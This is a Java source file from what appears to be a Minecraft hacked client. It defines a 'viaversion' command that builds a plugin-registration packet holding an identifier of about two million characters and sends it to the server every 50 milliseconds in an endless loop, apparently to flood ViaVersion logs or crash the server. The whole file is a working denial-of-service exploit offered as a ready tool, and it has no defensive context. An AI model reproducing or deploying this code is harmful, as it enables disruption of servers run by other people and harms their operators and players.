package io.github.spigotrce.paradiseclientprivate.exploit;

import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import io.github.spigotrce.paradiseclientfabric.Helper;
import io.github.spigotrce.paradiseclientfabric.command.Command;
import io.github.spigotrce.paradiseclientfabric.exploit.Exploit;
import net.fabricmc.fabric.api.client.command.v2.FabricClientCommandSource;
import net.fabricmc.fabric.impl.networking.RegistrationPayload;
import net.minecraft.client.MinecraftClient;
import net.minecraft.network.packet.c2s.common.CustomPayloadC2SPacket;
import net.minecraft.util.Identifier;

import java.util.ArrayList;

public class ViaVersionExploit extends Command {
    public ViaVersionExploit(MinecraftClient client) {
        super("viaversion", "ViaVersion logs fucker", client);
    }

    public void execute() {
        Helper.printChatMessage("Executing ViaVersion exploit!");
        new Thread(() -> {
            Helper.printChatMessage("Preparing payload!");
            ArrayList<Identifier> list = new ArrayList<>();
            list.add(Identifier.of("a".repeat(2097122)));
            CustomPayloadC2SPacket packet = new CustomPayloadC2SPacket(
                    new RegistrationPayload(
                            RegistrationPayload.REGISTER,
                            list
                    )
            );
            Helper.printChatMessage("Payload prepared!");
            Helper.printChatMessage("Sending payload packets!");
            while (true) {
                Helper.sendPacket(packet);

                try {
                    Thread.sleep(50);
                } catch (InterruptedException e) {
                    Helper.printChatMessage("[CrashExploit] [ViaVersion] Unable to sleep 50ms");
                }
            }
        }).start();
    }

    @Override
    public LiteralArgumentBuilder<FabricClientCommandSource> build() {
        return literal(getName())
                .executes(
                        context -> {
                            execute();
                            return SINGLE_SUCCESS;
                        }
                );
    }
}
